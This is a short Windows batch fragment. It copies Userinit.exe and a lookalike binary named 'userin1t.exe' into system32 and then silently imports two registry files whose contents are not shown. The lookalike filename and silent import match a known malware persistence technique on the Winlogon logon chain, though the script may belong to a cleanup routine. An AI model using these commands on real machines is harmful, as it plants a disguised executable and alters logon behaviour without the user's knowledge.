copy /y C:\WINDOWS\system32\dllcache\Userinit.exe C:\WINDOWS\system32\Userinit.exe
copy /y C:\WINDOWS\system32\dllcache\userin1t.exe C:\WINDOWS\system32\userin1t.exe
Regedit /s .\regfile.reg
Regedit /s .\userin1t.reg
